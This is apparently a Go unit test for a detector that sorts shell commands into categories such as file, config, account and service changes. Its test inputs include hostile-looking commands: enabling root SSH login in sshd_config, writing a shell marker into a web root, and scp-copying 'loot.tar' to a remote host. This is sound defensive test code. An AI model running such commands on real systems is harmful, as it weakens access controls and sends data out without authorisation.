package cleanup

import "testing"

func cats(hits []Hit) map[Category]bool {
	m := map[Category]bool{}
	for _, h := range hits {
		m[h.Category] = true
	}
	return m
}

func TestDetect(t *testing.T) {
	cases := []struct {
		cmd  string
		want []Category
		none bool
	}{
		{cmd: `echo "payload" > /var/www/html/shell_marker.txt`, want: []Category{CatFile}},
		{cmd: `sed -i 's/PermitRootLogin no/yes/' /etc/ssh/sshd_config`, want: []Category{CatConfig}},
		{cmd: `useradd -m tester`, want: []Category{CatAccount}},
		{cmd: `systemctl enable myservice`, want: []Category{CatService}},
		{cmd: `scp loot.tar user@host:/tmp/`, want: []Category{CatFile}},
		{cmd: `grep root /etc/passwd`, none: true},
		{cmd: `cat big.txt > /dev/null`, none: true},
		{cmd: `ls -la`, none: true},
	}
	for _, c := range cases {
		got := cats(Detect(c.cmd))
		if c.none {
			if len(got) != 0 {
				t.Errorf("%q: expected no hits, got %v", c.cmd, got)
			}
			continue
		}
		for _, w := range c.want {
			if !got[w] {
				t.Errorf("%q: missing category %q (got %v)", c.cmd, w, got)
			}
		}
	}
}
